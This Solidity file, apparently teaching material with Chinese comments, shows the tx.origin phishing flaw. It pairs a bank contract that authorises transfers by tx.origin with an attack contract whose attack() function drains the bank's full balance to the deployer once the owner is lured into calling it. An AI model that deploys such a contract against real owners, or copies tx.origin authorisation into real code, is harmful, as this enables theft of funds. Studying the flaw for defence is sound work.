// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract txOriginBank {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint256 _amount) public {
        //检查消息来源 ！！！ 可能owner会被诱导调用该函数，有钓鱼风险！
        require(tx.origin == owner, "Not owner");
        //转账ETH
        (bool sent,) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract txOriginAttack {
    // 受益者地址
    address payable public hacker;
    // Bank合约地址
    txOriginBank bank;

    constructor(txOriginBank _bank) {
        //强制将address类型的_bank转换为Bank类型
        bank = txOriginBank(_bank);
        //将受益者地址赋值为部署者地址
        hacker = payable(msg.sender);
    }

    function attack() public {
        //诱导bank合约的owner调用，于是bank合约内的余额就全部转移到黑客地址中
        bank.transfer(hacker, address(bank).balance);
    }
}
